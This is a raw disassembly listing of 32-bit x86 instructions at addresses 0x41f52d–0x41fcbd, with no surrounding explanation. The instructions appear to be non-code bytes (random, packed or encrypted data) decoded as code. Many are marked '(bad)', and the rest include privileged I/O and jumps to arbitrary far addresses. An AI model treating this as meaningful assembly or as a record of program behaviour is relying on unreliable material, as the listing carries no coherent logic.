  41f52d:	arpl   si,dx
  41f52f:	jmp    0xcfa8:0x727039b0
  41f536:	neg    BYTE PTR [eax]
  41f538:	dec    esp
  41f539:	in     eax,0x6d
  41f53b:	push   eax
  41f53c:	fisttp WORD PTR [eax]
  41f53e:	inc    edi
  41f53f:	cmp    DWORD PTR [esi],esi
  41f541:	ins    DWORD PTR es:[edi],dx
  41f542:	pushf  
  41f543:	mov    bl,BYTE PTR [ebp-0x79dbf9ea]
  41f549:	iret   
  41f54a:	inc    ecx
  41f54b:	cmp    al,0xdd
  41f54d:	rcr    BYTE PTR [ecx-0x6b178e49],0x6e
  41f554:	jo     0x41f5a0
  41f556:	inc    ebp
  41f557:	push   ebx
  41f558:	add    DWORD PTR [ebp+ebp*4+0x6f],edi
  41f55c:	cmp    esp,DWORD PTR [eax+edi*4+0x55]
  41f560:	lods   al,BYTE PTR ds:[esi]
  41f561:	pop    edx
  41f562:	cmp    eax,0x9911aa20
  41f567:	mov    WORD PTR [ebx-0x7ce20f7e],ds
  41f56d:	and    cl,ch
  41f56f:	jae    0x41f5e1
  41f571:	mov    dh,BYTE PTR [esi-0x61f10e6b]
  41f577:	mov    eax,0x32a9ba63
  41f57c:	xchg   esp,edx
  41f57e:	out    dx,eax
  41f57f:	gs jg  0x41f56c
  41f582:	ss enter 0x46c1,0x50
  41f587:	fld    QWORD PTR [ebx+0x603fe132]
  41f58d:	ins    BYTE PTR es:[edi],dx
  41f58e:	jmp    0x47f19ded
  41f593:	mov    esp,0x1a953c2c
  41f598:	shl    DWORD PTR [ecx+0x7f],1
  41f59b:	mov    bl,0xa4
  41f59d:	or     al,0x9e
  41f59f:	inc    esp
  41f5a0:	push   ebx
  41f5a1:	push   eax
  41f5a2:	fstp   DWORD PTR [ecx]
  41f5a4:	push   cs
  41f5a5:	xor    al,0x39
  41f5a7:	and    BYTE PTR [esi],dh
  41f5a9:	xchg   DWORD PTR [edx],eax
  41f5ab:	inc    ebx
  41f5ac:	mov    cs,WORD PTR [ebp+eiz*4+0x66]
  41f5b0:	mov    ecx,0x17e628a3
  41f5b5:	and    BYTE PTR [edx+edi*4+0x210fcd64],ch
  41f5bc:	int    0x45
  41f5be:	and    BYTE PTR [edx+0x585d4b20],bl
  41f5c4:	sub    al,0xd8
  41f5c6:	xchg   ecx,eax
  41f5c7:	push   ebp
  41f5c8:	fbld   TBYTE PTR [eax]
  41f5ca:	mov    ebx,es
  41f5cc:	xor    al,0x5c
  41f5ce:	xchg   esp,eax
  41f5cf:	fmul   DWORD PTR [edx+edi*4+0x44729fa0]
  41f5d6:	mov    BYTE PTR [edi+0x4],dl
  41f5d9:	sub    BYTE PTR [ebp+0x133e7750],0x34
  41f5e0:	call   0x10efb5f3
  41f5e5:	push   ebx
  41f5e6:	shufps xmm1,XMMWORD PTR [esi],0x2
  41f5ea:	fs and eax,0xf8934863
  41f5f0:	test   BYTE PTR [ebp+edx*4+0x2c70b24],bh
  41f5f7:	mov    ds:0x7b3bc3f1,eax
  41f5fc:	inc    BYTE PTR [edx]
  41f5fe:	mov    bl,0xca
  41f600:	jp     0x41f596
  41f602:	lock scas al,BYTE PTR es:[edi]
  41f604:	or     ecx,DWORD PTR [edi+0x8]
  41f607:	hlt    
  41f608:	inc    edx
  41f609:	sub    al,0xae
  41f60b:	div    BYTE PTR [edx-0x5b]
  41f60e:	les    esp,FWORD PTR [ebp+0x729f9ae4]
  41f614:	enter  0xbc19,0xb7
  41f618:	aaa    
  41f619:	loop   0x41f5e3
  41f61b:	(bad)  [ecx-0x14cabb5e]
  41f621:	scas   al,BYTE PTR es:[edi]
  41f622:	scas   eax,DWORD PTR es:[edi]
  41f623:	xchg   ecx,eax
  41f624:	out    0xcf,eax
  41f626:	aam    0x85
  41f628:	iret   
  41f629:	mov    ss,WORD PTR [eax+0x62]
  41f62c:	retf   0x3532
  41f62f:	iret   
  41f630:	mov    eax,0x403d544
  41f635:	jne    0x41f618
  41f637:	shl    ebx,0x73
  41f63a:	(bad)  ds:0x825cc962
  41f640:	mov    ebx,0x99ab9f06
  41f645:	popf   
  41f646:	push   ecx
  41f647:	out    dx,eax
  41f648:	ds inc eax
  41f64a:	jge    0x41f6ca
  41f64c:	stc    
  41f64d:	aam    0xbc
  41f64f:	xor    cl,BYTE PTR es:[edx]
  41f652:	and    eax,0x11306239
  41f657:	xchg   esi,eax
  41f658:	jp     0x41f662
  41f65a:	sub    dh,0x16
  41f65d:	xor    ch,BYTE PTR [ebp+0x7ccd4d91]
  41f663:	mov    ds:0xaff902eb,al
  41f668:	xchg   dl,cl
  41f66a:	mov    esi,ecx
  41f66c:	mov    dl,bh
  41f66e:	push   eax
  41f66f:	xchg   ebx,eax
  41f670:	or     DWORD PTR [eax+0x1a],edx
  41f673:	jmp    0x1a8108f2
  41f678:	clc    
  41f679:	(bad)  
  41f67a:	out    0xbc,eax
  41f67c:	inc    esi
  41f67d:	mov    ebx,0x34134b40
  41f682:	dec    ebx
  41f683:	fistp  WORD PTR [esi]
  41f685:	or     BYTE PTR [ebp+0x64],0xc9
  41f689:	cmc    
  41f68a:	hlt    
  41f68b:	popf   
  41f68c:	ror    BYTE PTR [eax-0x513b0579],1
  41f692:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f693:	neg    BYTE PTR [eax+0x1f]
  41f696:	or     eax,0x2a560b45
  41f69b:	(bad)  
  41f69d:	and    al,0xef
  41f69f:	in     al,dx
  41f6a0:	xor    BYTE PTR [eax-0x6a686674],0x2a
  41f6a7:	sub    al,0x1b
  41f6a9:	xor    eax,0x4d3209b7
  41f6ae:	adc    BYTE PTR [esi+ebx*4],ah
  41f6b1:	and    esp,ebp
  41f6b3:	lock push es
  41f6b5:	sub    bl,BYTE PTR [eax]
  41f6b7:	or     BYTE PTR [edx-0x68f21a24],dl
  41f6bd:	(bad)  
  41f6be:	jbe    0x41f717
  41f6c0:	jl     0x41f67d
  41f6c2:	mov    bl,BYTE PTR [eax-0x423dbc4f]
  41f6c8:	mov    ds:0x49d78f66,al
  41f6cd:	mov    esi,0x9b658540
  41f6d2:	repnz lods eax,DWORD PTR ds:[esi]
  41f6d4:	inc    edx
  41f6d5:	or     dl,BYTE PTR [ecx+0x1b]
  41f6d8:	aam    0x4
  41f6da:	sar    BYTE PTR [edi],1
  41f6dc:	and    eax,DWORD PTR [eax]
  41f6de:	pop    ss
  41f6df:	pop    es
  41f6e0:	sbb    eax,0x23306199
  41f6e5:	xchg   BYTE PTR [ebx],dh
  41f6e7:	mov    esi,DWORD PTR [edi]
  41f6e9:	in     al,0x12
  41f6eb:	das    
  41f6ec:	cmp    ah,bl
  41f6ee:	mov    ch,0x48
  41f6f0:	mov    cl,0x70
  41f6f2:	pop    ebp
  41f6f3:	jmp    0x41f6d9
  41f6f5:	mov    esp,0x4e8794b9
  41f6fa:	lods   eax,DWORD PTR ds:[esi]
  41f6fb:	xor    BYTE PTR [ecx+ebp*2+0x3e],dl
  41f6ff:	lock xor esp,DWORD PTR [ecx+0x33]
  41f703:	cli    
  41f704:	fnstsw WORD PTR [eax-0x14]
  41f707:	mov    ebx,0xbe1d29f7
  41f70c:	push   ebp
  41f70d:	into   
  41f70e:	xchg   ebx,eax
  41f70f:	addr16 aad 0x95
  41f712:	jbe    0x41f728
  41f714:	imul   ecx,DWORD PTR [ebx+0x51a187dd],0x1a
  41f71b:	stos   DWORD PTR es:[edi],eax
  41f71c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f71d:	retf   0xa8e7
  41f720:	mov    al,0x36
  41f722:	mov    edx,0xa5eef15b
  41f727:	push   ds
  41f728:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f729:	inc    edi
  41f72a:	sub    bh,al
  41f72c:	les    ebp,FWORD PTR [edi]
  41f72e:	repnz pop es
  41f730:	sysenter 
  41f732:	and    al,0xbb
  41f734:	cdq    
  41f735:	xchg   ebp,eax
  41f736:	mov    eax,0x32294081
  41f73b:	mov    edi,0xdbbba73a
  41f740:	sbb    esp,DWORD PTR [edx]
  41f742:	xor    edx,esp
  41f744:	cmp    bh,dh
  41f746:	mov    WORD PTR [ecx],gs
  41f748:	sub    cl,0x78
  41f74b:	iret   
  41f74c:	sub    dh,BYTE PTR [eax]
  41f74e:	mov    ds:0xcf3c5a2c,eax
  41f753:	(bad)  
  41f754:	pop    eax
  41f755:	icebp  
  41f756:	rol    DWORD PTR [edi-0x3e79b6f2],0x9b
  41f75d:	mov    dl,0xf
  41f75f:	inc    edx
  41f760:	mov    ebx,0x81cd9887
  41f765:	in     eax,0x56
  41f767:	cmc    
  41f768:	cwde   
  41f769:	and    bh,BYTE PTR ds:0x24593ce4
  41f76f:	jns    0x41f7b0
  41f771:	dec    eax
  41f772:	call   0xdda:0x7de4dfa8
  41f779:	push   ecx
  41f77a:	xor    bh,dl
  41f77c:	sub    DWORD PTR ss:[ebp+0x735b2b3c],ecx
  41f783:	or     bh,cl
  41f785:	mov    al,ds:0x5eb3c96e
  41f78a:	sub    DWORD PTR [edi],edi
  41f78c:	sbb    BYTE PTR [esi-0x2f1e4b8e],al
  41f792:	fcmovne st,st(6)
  41f794:	cli    
  41f795:	xchg   ecx,eax
  41f796:	push   0xffffff87
  41f798:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f799:	push   esp
  41f79a:	sub    eax,0x88aba2c4
  41f79f:	jmp    0x9a4298ba
  41f7a4:	sub    esi,DWORD PTR [eax-0x2c]
  41f7a7:	or     BYTE PTR [esi-0xd478a8e],cl
  41f7ad:	ins    BYTE PTR es:[edi],dx
  41f7ae:	cmp    al,0xf2
  41f7b0:	fld    QWORD PTR [bx]
  41f7b3:	and    al,0x7b
  41f7b5:	jle    0x41f832
  41f7b7:	mov    ah,0x96
  41f7b9:	mov    BYTE PTR [ecx],bl
  41f7bb:	rcl    BYTE PTR [ebx+0x6f8289dd],0xd
  41f7c2:	nop
  41f7c3:	sub    dh,BYTE PTR [edi+eax*4-0x74333cd1]
  41f7ca:	fstp   DWORD PTR [ebx+0x16]
  41f7cd:	adc    esi,DWORD PTR [ecx-0x68]
  41f7d0:	call   0x3a4c:0x7fbe90f9
  41f7d7:	(bad)  
  41f7d8:	clc    
  41f7d9:	mov    ch,0xc7
  41f7db:	pop    esi
  41f7dc:	cdq    
  41f7dd:	mul    BYTE PTR [ebx]
  41f7df:	jl     0x41f7c2
  41f7e1:	jno    0x41f77c
  41f7e3:	mov    dl,0xd4
  41f7e5:	cmp    eax,0x31ce35f4
  41f7ea:	xchg   ebx,eax
  41f7eb:	shufps xmm0,xmm2,0x54
  41f7ef:	cmp    eax,DWORD PTR [esi+0x4143f00a]
  41f7f5:	out    0xca,eax
  41f7f7:	outs   dx,BYTE PTR ds:[esi]
  41f7f8:	in     eax,dx
  41f7f9:	or     eax,DWORD PTR [ebp+0x75]
  41f7fc:	pop    esi
  41f7fd:	in     eax,0x1b
  41f7ff:	or     eax,0x9970003
  41f804:	out    dx,eax
  41f805:	pop    esi
  41f806:	sub    al,0x47
  41f808:	daa    
  41f809:	dec    eax
  41f80a:	cmp    esp,DWORD PTR [edx]
  41f80c:	or     eax,0x9784725f
  41f811:	xor    DWORD PTR [ebp-0x7f895e13],edx
  41f817:	jae    0x41f896
  41f819:	mov    al,0x53
  41f81b:	fadd   DWORD PTR [edx-0x7f]
  41f81e:	pop    ebx
  41f81f:	test   BYTE PTR [edx+0x2a],cl
  41f822:	jno    0x41f86f
  41f824:	pop    edx
  41f825:	mov    ah,0x3f
  41f827:	xchg   esp,eax
  41f829:	adc    ebx,DWORD PTR [edi-0x32]
  41f82c:	pop    es
  41f82d:	(bad)  
  41f82e:	retf   
  41f82f:	fiadd  DWORD PTR ds:0x97d2a1d
  41f835:	call   DWORD PTR [eax-0x797579cb]
  41f83b:	bound  esi,QWORD PTR [eax-0x4dec164a]
  41f841:	or     al,0x2b
  41f843:	adc    BYTE PTR [esi+ecx*8],0x59
  41f847:	lahf   
  41f848:	jle    0x41f7d2
  41f84a:	add    eax,0xd83ba319
  41f84f:	xchg   cl,ch
  41f851:	jmp    0x41f885
  41f853:	pop    eax
  41f854:	push   esi
  41f855:	mov    esp,0x9fc9281d
  41f85a:	ret    
  41f85b:	push   ds
  41f85c:	push   cs
  41f85d:	xor    dh,bh
  41f85f:	and    edi,DWORD PTR [edx-0x56]
  41f862:	cmp    dh,BYTE PTR [ebx-0xc9d5dbd]
  41f868:	mov    bh,0x9e
  41f86a:	(bad)  
  41f86b:	cli    
  41f86c:	push   0x8cd344cd
  41f871:	ret    
  41f872:	shl    DWORD PTR [edi-0x21],cl
  41f875:	bound  esi,QWORD PTR [ecx-0x3a]
  41f878:	xchg   esp,eax
  41f879:	jnp    0x41f84d
  41f87b:	dec    ebx
  41f87c:	push   0xe9741895
  41f881:	aaa    
  41f882:	or     ebx,eax
  41f884:	add    esi,ecx
  41f886:	jmp    0x883c18ec
  41f88b:	push   cs
  41f88c:	mov    WORD PTR es:[edx-0x19c3315b],es
  41f893:	jmp    0x672d5731
  41f898:	mov    esi,0xdbcda97f
  41f89d:	sub    dh,BYTE PTR [ecx-0x20]
  41f8a0:	push   ebp
  41f8a1:	pushf  
  41f8a2:	sub    DWORD PTR [edi-0x3373f9ff],eax
  41f8a8:	sbb    edx,DWORD PTR [esi]
  41f8aa:	jb     0x41f884
  41f8ac:	sub    al,0x32
  41f8ae:	mov    eax,ds:0x4518243d
  41f8b3:	push   edx
  41f8b4:	xor    esi,ebx
  41f8b6:	(bad)  
  41f8b7:	int3   
  41f8b8:	mov    ah,0xae
  41f8ba:	jle    0x41f885
  41f8bc:	shl    DWORD PTR ds:0x448023b,1
  41f8c2:	(bad)  
  41f8c3:	cld    
  41f8c4:	jecxz  0x41f8fd
  41f8c6:	cmp    BYTE PTR [ebx-0x1d9936d0],al
  41f8cc:	js     0x41f869
  41f8ce:	dec    esi
  41f8cf:	(bad)  
  41f8d0:	not    ah
  41f8d2:	js     0x41f925
  41f8d4:	shl    dl,cl
  41f8d6:	(bad)  
  41f8d7:	dec    eax
  41f8d8:	xor    DWORD PTR [edx+0x6c],ebx
  41f8db:	jns    0x41f933
  41f8dd:	sbb    eax,0xd2109b08
  41f8e2:	jb     0x41f949
  41f8e4:	add    ah,BYTE PTR [ecx]
  41f8e6:	jne    0x41f895
  41f8e8:	adc    bl,BYTE PTR [edi+0x50a987ab]
  41f8ee:	into   
  41f8ef:	sti    
  41f8f0:	sti    
  41f8f1:	jge    0x41f928
  41f8f3:	lea    esi,[ecx]
  41f8f5:	pop    ebp
  41f8f6:	push   esi
  41f8f7:	in     al,0xf
  41f8f9:	scas   al,BYTE PTR es:[edi]
  41f8fa:	pop    ecx
  41f8fb:	ret    
  41f8fc:	stos   BYTE PTR es:[edi],al
  41f8fd:	aam    0x1c
  41f8ff:	fdivr  st(0),st
  41f901:	jp     0x41f903
  41f903:	or     bh,bl
  41f905:	cmp    eax,DWORD PTR [ebx-0xab7d4e9]
  41f90b:	push   ebx
  41f90c:	fnsave [edi-0x2886e294]
  41f912:	stos   DWORD PTR es:[edi],eax
  41f913:	push   ss
  41f914:	xor    ebp,edx
  41f916:	test   eax,0xc907c940
  41f91b:	push   0xef7c5a54
  41f920:	or     esp,DWORD PTR [edx+edx*2]
  41f923:	ins    BYTE PTR es:[edi],dx
  41f924:	jmp    0x41f8a8
  41f926:	jmp    0x41f905
  41f928:	xor    ebx,eax
  41f92a:	in     eax,dx
  41f92b:	test   BYTE PTR [esi],ah
  41f92d:	rol    DWORD PTR [edi],1
  41f92f:	pop    ecx
  41f930:	call   0x1f376ec2
  41f935:	sub    edi,DWORD PTR [edx+0x74bc1091]
  41f93b:	test   DWORD PTR [edi+0x15],0x4f06b91c
  41f942:	iret   
  41f943:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f944:	or     bh,BYTE PTR [ecx+0x7f90a854]
  41f94a:	jb     0x41f90e
  41f94c:	jge    0x41f8f3
  41f94e:	not    DWORD PTR [ebp-0x1b]
  41f951:	into   
  41f952:	sub    esi,DWORD PTR [esi]
  41f954:	es popa 
  41f956:	fimul  WORD PTR [eax+0x7921f5e3]
  41f95c:	popa   
  41f95d:	xor    dh,BYTE PTR [ebx+0x7bf291eb]
  41f963:	lds    ebp,FWORD PTR [edx+0x58fa811b]
  41f969:	push   eax
  41f96a:	pop    ss
  41f96b:	cmp    eax,DWORD PTR [edx]
  41f96d:	lods   al,BYTE PTR ds:[esi]
  41f96e:	out    dx,al
  41f96f:	or     dh,BYTE PTR ds:0x111cbac9
  41f975:	cmp    cl,bl
  41f977:	hlt    
  41f978:	(bad)  
  41f97a:	inc    ebx
  41f97b:	scas   eax,DWORD PTR es:[edi]
  41f97c:	sub    ebx,esp
  41f97e:	jecxz  0x41f988
  41f980:	rcl    DWORD PTR [ebp+0x5b296e32],1
  41f986:	int    0x21
  41f988:	jge    0x41f9b9
  41f98a:	cmp    DWORD PTR [eax],esp
  41f98c:	mov    al,ds:0xdbc244fb
  41f991:	test   eax,0xa9e53cfc
  41f996:	(bad)  
  41f997:	jp     0x41fa0e
  41f999:	clc    
  41f99a:	ret    0xe94e
  41f99d:	sti    
  41f99e:	ds pushf 
  41f9a0:	push   esp
  41f9a1:	xchg   esi,eax
  41f9a2:	(bad)  
  41f9a3:	daa    
  41f9a4:	push   edx
  41f9a5:	cmp    ch,BYTE PTR [ebp+eiz*8-0x6b]
  41f9a9:	push   ebp
  41f9aa:	mov    cl,0x4f
  41f9ac:	sub    al,0x64
  41f9ae:	mov    ebp,0xab879792
  41f9b3:	jecxz  0x41f985
  41f9b5:	std    
  41f9b6:	leave  
  41f9b7:	aad    0x29
  41f9b9:	cld    
  41f9ba:	mov    bl,0xed
  41f9bc:	ret    0x78df
  41f9bf:	std    
  41f9c0:	(bad)  
  41f9c1:	sbb    eax,0x8b616fdd
  41f9c6:	xor    bh,0xc4
  41f9c9:	rcl    BYTE PTR [ecx-0x7a60fa47],1
  41f9cf:	outs   dx,BYTE PTR ds:[esi]
  41f9d0:	(bad)  
  41f9d2:	xchg   ecx,eax
  41f9d3:	mov    ebp,DWORD PTR [ebx-0x1f]
  41f9d6:	pop    ds
  41f9d7:	inc    esp
  41f9d8:	pop    ss
  41f9d9:	push   esi
  41f9da:	lea    esp,[ebp+0x18]
  41f9dd:	sbb    al,0xdd
  41f9df:	ror    ch,cl
  41f9e1:	retf   0xf39b
  41f9e4:	out    0x71,eax
  41f9e6:	(bad)  
  41f9e7:	mov    ebp,0x8f4f040f
  41f9ec:	push   0xa8f21730
  41f9f1:	mov    WORD PTR [ebp-0x65e0dbc2],es
  41f9f7:	xchg   ebp,eax
  41f9f8:	int3   
  41f9f9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f9fa:	mov    bh,0xef
  41f9fc:	aaa    
  41f9fd:	addr16 pop ds
  41f9ff:	mov    dl,0x29
  41fa01:	popa   
  41fa02:	mov    DWORD PTR [ebp-0x75],0xf811718
  41fa09:	sub    eax,0x1b5adb76
  41fa0e:	xchg   esp,eax
  41fa0f:	adc    eax,0x48808152
  41fa14:	rcr    eax,0x98
  41fa17:	xchg   edx,eax
  41fa18:	adc    esp,eax
  41fa1a:	xchg   BYTE PTR [edx],al
  41fa1c:	add    esp,DWORD PTR [ebp+0x24b273]
  41fa22:	retf   
  41fa23:	jg     0x41f9a9
  41fa25:	xchg   edx,eax
  41fa26:	rol    dl,1
  41fa28:	(bad)  
  41fa29:	scas   eax,DWORD PTR es:[edi]
  41fa2a:	popf   
  41fa2b:	fwait
  41fa2c:	push   0x6f
  41fa2e:	and    dh,BYTE PTR [edx]
  41fa30:	cmc    
  41fa31:	int    0xd7
  41fa33:	xchg   edx,eax
  41fa34:	and    BYTE PTR [ebx-0x30c21d22],bh
  41fa3a:	loopne 0x41fa81
  41fa3c:	push   eax
  41fa3d:	in     al,0xb5
  41fa3f:	lock sbb ebx,DWORD PTR [esi+eax*8+0x72]
  41fa44:	sti    
  41fa45:	or     BYTE PTR [esi],dh
  41fa47:	push   ebx
  41fa48:	pop    es
  41fa49:	jecxz  0x41fa11
  41fa4b:	shl    DWORD PTR [edx-0x62],0x92
  41fa4f:	int    0x1
  41fa51:	add    dh,dh
  41fa53:	scas   al,BYTE PTR es:[edi]
  41fa54:	sub    BYTE PTR [edx],cl
  41fa56:	sbb    al,0x3b
  41fa58:	stc    
  41fa59:	test   al,ah
  41fa5b:	(bad)  
  41fa5c:	and    DWORD PTR [edx+0x31],edi
  41fa5f:	imul   eax,DWORD PTR [esi+0x5d],0x6e
  41fa63:	mov    bl,0x6a
  41fa65:	dec    ecx
  41fa66:	jbe    0x41facf
  41fa68:	js     0x41f9ea
  41fa6a:	repnz adc al,0xbe
  41fa6d:	repnz mov edi,0xf0827219
  41fa73:	aaa    
  41fa74:	(bad)  
  41fa75:	pop    ebx
  41fa76:	mov    ebx,0xad11c8cd
  41fa7b:	xor    dh,BYTE PTR [ebx]
  41fa7d:	out    dx,al
  41fa7e:	pop    esi
  41fa7f:	fwait
  41fa80:	inc    esp
  41fa81:	mov    ds:0x27f36895,al
  41fa86:	aaa    
  41fa87:	pushf  
  41fa88:	pop    ebx
  41fa89:	dec    eax
  41fa8a:	adc    bh,BYTE PTR [eax]
  41fa8c:	outs   dx,DWORD PTR ds:[esi]
  41fa8d:	sbb    eax,0xdcfdad3f
  41fa92:	ss icebp 
  41fa94:	ja     0x41fa34
  41fa96:	mov    bl,0xba
  41fa98:	(bad)  
  41fa9a:	and    WORD PTR [eax+eax*1],ax
  41fa9e:	retf   0x6c54
  41faa1:	retf   
  41faa2:	sti    
  41faa3:	dec    esi
  41faa4:	dec    eax
  41faa5:	lods   al,BYTE PTR ds:[esi]
  41faa6:	scas   eax,DWORD PTR es:[edi]
  41faa7:	in     eax,dx
  41faa8:	sbb    BYTE PTR ds:0xc30195d6,0xe4
  41faaf:	xchg   esp,eax
  41fab0:	call   0xd3d43883
  41fab5:	in     al,0x35
  41fab7:	xchg   ecx,eax
  41fab8:	xor    DWORD PTR [edx],0xffffffa6
  41fabb:	inc    DWORD PTR [esi]
  41fabd:	sub    dh,ch
  41fabf:	rol    BYTE PTR [edi],0x54
  41fac2:	or     esp,DWORD PTR [ebx-0x1309c691]
  41fac8:	add    dh,BYTE PTR [ebx+0x28e6ce73]
  41face:	pop    ebx
  41facf:	ins    BYTE PTR es:[edi],dx
  41fad0:	pop    edx
  41fad1:	or     edi,DWORD PTR [eax+0x1de26086]
  41fad7:	cli    
  41fad8:	inc    edx
  41fad9:	call   0x39f3:0xe1e09133
  41fae0:	repnz or BYTE PTR [ebx],ch
  41fae3:	dec    ebp
  41fae4:	dec    eax
  41fae5:	or     DWORD PTR [ecx-0x46977cc8],ebx
  41faeb:	leave  
  41faec:	imul   BYTE PTR [ecx-0x7b479ef6]
  41faf2:	sub    BYTE PTR [ecx+ebx*4-0x290e2d2e],0xdf
  41fafa:	pushf  
  41fafb:	jns    0x41fb5d
  41fafd:	dec    edi
  41fafe:	fist   DWORD PTR [edx+eax*2-0x53]
  41fb02:	mov    ds:0x71393868,al
  41fb07:	loope  0x41faf3
  41fb09:	out    0xa2,eax
  41fb0b:	sub    BYTE PTR [ebx],al
  41fb0d:	arpl   WORD PTR [ebx+0x5169e1b4],dx
  41fb13:	mov    ah,0xf7
  41fb15:	(bad)
  41fb18:	jbe    0x41fada
  41fb1a:	int3   
  41fb1b:	ss adc al,0xb3
  41fb1e:	ss push cs
  41fb20:	scas   eax,DWORD PTR es:[edi]
  41fb21:	sub    eax,0x825fdb5
  41fb26:	lods   al,BYTE PTR ds:[esi]
  41fb27:	inc    edi
  41fb28:	out    0xe5,eax
  41fb2a:	fidiv  DWORD PTR fs:[edx+0x6fb5823c]
  41fb31:	mov    ebp,0x49a4787a
  41fb36:	add    eax,0x95f3b7ff
  41fb3b:	iret   
  41fb3c:	xor    edi,DWORD PTR [ebp+ecx*2+0x4d]
  41fb40:	sar    DWORD PTR [edi+0x1de72cde],cl
  41fb46:	sub    edi,DWORD PTR [eax]
  41fb48:	sub    al,0xa2
  41fb4a:	and    al,BYTE PTR [eax-0xaae0d29]
  41fb50:	ficomp DWORD PTR [ecx+0x47d4043d]
  41fb56:	add    BYTE PTR [esi],bl
  41fb58:	retf   0xc3ed
  41fb5b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fb5c:	mov    BYTE PTR [ecx],cl
  41fb5e:	test   eax,0xad57fabd
  41fb63:	pop    esp
  41fb64:	shr    DWORD PTR [ebx+0x2f],1
  41fb67:	push   ebp
  41fb68:	in     eax,dx
  41fb69:	(bad)  
  41fb6a:	mov    ebp,0x76b582d7
  41fb6f:	adc    edx,DWORD PTR [esi+0x6dcbfe82]
  41fb75:	aam    0x85
  41fb77:	enter  0x8b68,0x12
  41fb7b:	icebp  
  41fb7c:	jmp    0x2f32:0xcbad28e4
  41fb83:	push   eax
  41fb84:	cmp    eax,0xac0a5a90
  41fb89:	rol    dh,0x44
  41fb8c:	cwde   
  41fb8d:	add    esi,DWORD PTR [eax]
  41fb8f:	inc    ebx
  41fb90:	inc    ebx
  41fb91:	loop   0x41fba4
  41fb93:	outs   dx,DWORD PTR ds:[esi]
  41fb94:	pop    ebx
  41fb95:	test   DWORD PTR [eax+eiz*1],esi
  41fb98:	loopne 0x41fb59
  41fb9a:	out    dx,al
  41fb9b:	sub    BYTE PTR [esi],0x47
  41fb9e:	sahf   
  41fb9f:	cmp    eax,0x11b2625a
  41fba4:	rcl    BYTE PTR [edx+eiz*8],0xeb
  41fba8:	pop    edi
  41fba9:	inc    esp
  41fbaa:	cmp    DWORD PTR [esi-0x2b8fe29],ebx
  41fbb0:	and    edx,DWORD PTR [eax+ebx*8]
  41fbb3:	mov    eax,0xfa5a7c75
  41fbb8:	mov    eax,ds:0x5c749c90
  41fbbd:	sub    eax,0x6eb1d340
  41fbc2:	mov    ebp,0x47d5827
  41fbc7:	cmp    al,0x73
  41fbc9:	data16 sub al,0x81
  41fbcc:	call   0xcd40:0x27b969a3
  41fbd3:	and    eax,DWORD PTR [ebx+0x70bca8af]
  41fbd9:	fistp  DWORD PTR ds:0x69510c5b
  41fbdf:	test   BYTE PTR [ebp+0x7],bh
  41fbe2:	jl     0x41fbc9
  41fbe4:	pop    ebx
  41fbe5:	sahf   
  41fbe6:	and    DWORD PTR [edx-0x639a7823],0xffffff9a
  41fbed:	xchg   ecx,eax
  41fbee:	xor    eax,0x71ac1779
  41fbf3:	pop    esi
  41fbf4:	loopne 0x41fc3f
  41fbf6:	out    0xa9,eax
  41fbf8:	mov    eax,ds:0x59b995b6
  41fbfd:	push   esp
  41fbfe:	or     al,0x45
  41fc00:	jle    0x41fbd9
  41fc02:	pop    eax
  41fc03:	adc    eax,0xf2dcde73
  41fc08:	pop    esp
  41fc09:	popa   
  41fc0a:	and    BYTE PTR [edx-0x6195f307],0xac
  41fc11:	sar    BYTE PTR [edi-0x38297427],cl
  41fc17:	push   edi
  41fc18:	into   
  41fc19:	dec    esi
  41fc1a:	xchg   esi,eax
  41fc1b:	or     al,BYTE PTR [edx]
  41fc1d:	(bad)  
  41fc1f:	xor    dh,0x13
  41fc22:	(bad)  
  41fc23:	pop    edx
  41fc24:	leave  
  41fc25:	cli    
  41fc26:	dec    ebx
  41fc27:	mov    eax,0x1d361189
  41fc2c:	imul   esp,DWORD PTR [esi+0x476966f8],0x1a6f35c9
  41fc36:	dec    edi
  41fc37:	int    0xcf
  41fc39:	mov    ebx,0x9f17c600
  41fc3e:	sub    edx,DWORD PTR [esi+0x3c]
  41fc41:	cmp    BYTE PTR [ecx],cl
  41fc43:	lods   eax,DWORD PTR ds:[esi]
  41fc44:	cli    
  41fc45:	div    DWORD PTR [esi+ebx*8]
  41fc48:	jmp    0xfe1e9622
  41fc4d:	fs pop esp
  41fc4f:	mov    ds:0x9c7dde84,al
  41fc54:	sub    eax,ebp
  41fc56:	fpatan 
  41fc58:	mov    cl,0xa5
  41fc5a:	dec    ebp
  41fc5b:	fistp  QWORD PTR [eax+0x44]
  41fc5e:	lods   eax,DWORD PTR ds:[esi]
  41fc5f:	xchg   DWORD PTR [edi+0x4c],edx
  41fc62:	call   0xeec:0x4e179b72
  41fc69:	in     eax,0x6f
  41fc6b:	test   eax,0x46b72e84
  41fc70:	adc    bh,BYTE PTR [esi-0x27]
  41fc73:	(bad)  
  41fc75:	mov    es,ebx
  41fc77:	adc    DWORD PTR [ebx+0x6f],edi
  41fc7a:	mov    bl,0x79
  41fc7c:	mov    esi,0x2c7ed729
  41fc81:	cmp    DWORD PTR [edi+0x7c],edi
  41fc84:	xchg   esi,eax
  41fc85:	ins    DWORD PTR es:[edi],dx
  41fc86:	xor    DWORD PTR [ebx+0x79],esp
  41fc89:	push   ss
  41fc8a:	(bad)  
  41fc8b:	jl     0x41fcbc
  41fc8d:	jecxz  0x41fcdb
  41fc8f:	aaa    
  41fc90:	xor    al,0xbc
  41fc92:	or     al,0x6d
  41fc94:	ret    
  41fc95:	rcr    al,0xf
  41fc98:	lea    edi,[edx+0x607948d1]
  41fc9e:	sub    DWORD PTR [eax],esp
  41fca0:	je     0x41fc55
  41fca2:	xchg   esp,eax
  41fca3:	mov    bl,0x9e
  41fca5:	xor    al,0xaf
  41fca7:	aam    0xc1
  41fca9:	arpl   bx,ax
  41fcab:	clc    
  41fcac:	cli    
  41fcad:	cmp    dl,BYTE PTR [eax]
  41fcaf:	fdiv   st,st(5)
  41fcb1:	faddp  st(7),st
  41fcb3:	loopne 0x41fd11
  41fcb5:	dec    edi
  41fcb6:	cmp    esp,DWORD PTR [ecx+eax*2-0x5574a833]
  41fcbd:	sbb    al,0x2
